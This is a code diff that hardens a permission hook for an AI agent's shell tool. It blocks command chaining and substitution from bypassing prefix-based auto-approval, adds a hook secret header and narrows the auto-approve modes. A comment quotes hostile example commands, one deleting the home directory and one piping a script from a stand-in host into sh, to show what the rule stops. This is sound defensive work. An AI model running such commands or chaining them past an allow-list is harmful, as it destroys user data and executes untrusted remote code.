@@ -127,6 +127,25 @@ function getMatchValue(toolName: string, toolInput: unknown): string {
   }
 }
 
+// Shell chain/separator metacharacters. `Bash(ls:*)` must NOT auto-approve
+// `ls; rm -rf ~` or `ls && curl evil.sh | sh` — every segment has to match
+// the allowed prefix independently.
+const BASH_CHAIN_REGEX = /\s*(?:;|&&|\|\||\|)\s*/;
+// Command substitution spawns a subshell whose contents the prefix match
+// cannot reason about. Backticks and $() are refused outright.
+const BASH_SUBSTITUTION_REGEX = /`|\$\(/;
+
+function matchBashPrefix(command: string, prefix: string): boolean {
+  if (BASH_SUBSTITUTION_REGEX.test(command)) {
+    return false;
+  }
+  const segments = command.split(BASH_CHAIN_REGEX).map((s) => s.trim()).filter(Boolean);
+  if (segments.length === 0) {
+    return false;
+  }
+  return segments.every((segment) => segment.startsWith(prefix));
+}
+
 // Check if a tool invocation matches a pattern
 // Pattern format: Tool(prefix:*) or Tool(:*) for any
 function matchesPattern(pattern: string, toolName: string, toolInput: unknown): boolean {
@@ -151,6 +170,10 @@ function matchesPattern(pattern: string, toolName: string, toolInput: unknown): 
 
   // Get the value to match against
   const matchValue = getMatchValue(toolName, toolInput);
+
+  if (toolName === 'Bash') {
+    return matchBashPrefix(matchValue, patternPrefix);
+  }
 
   // Check if the value starts with the pattern prefix
   return matchValue.startsWith(patternPrefix);
@@ -233,6 +256,8 @@ function makeRequest(
     const isHttps = parsedUrl.protocol === 'https:';
     const client = isHttps ? https : http;
 
+    const hookSecret = process.env.WEBUI_HOOK_SECRET || '';
+
     const requestOptions = {
       hostname: parsedUrl.hostname,
       port: parsedUrl.port || (isHttps ? 443 : 80),
@@ -240,6 +265,7 @@ function makeRequest(
       method: options.method,
       headers: {
         'Content-Type': 'application/json',
+        ...(hookSecret ? { 'X-Webui-Hook-Secret': hookSecret } : {}),
         ...(options.body ? { 'Content-Length': Buffer.byteLength(options.body) } : {}),
       },
       timeout: options.timeout || 130000, // Default 130s to allow for 2min long-poll
@@ -386,7 +412,7 @@ async function main(): Promise<void> {
       process.exit(0);
     }
 
-    if (sessionMode === 'auto-accept' || sessionMode === 'orchestration' || sessionMode === 'danger') {
+    if (sessionMode === 'auto-accept' || sessionMode === 'danger') {
       log(`Auto-approved tool due to mode ${sessionMode || 'auto-accept'}`);
       outputDecision('allow');
       return;
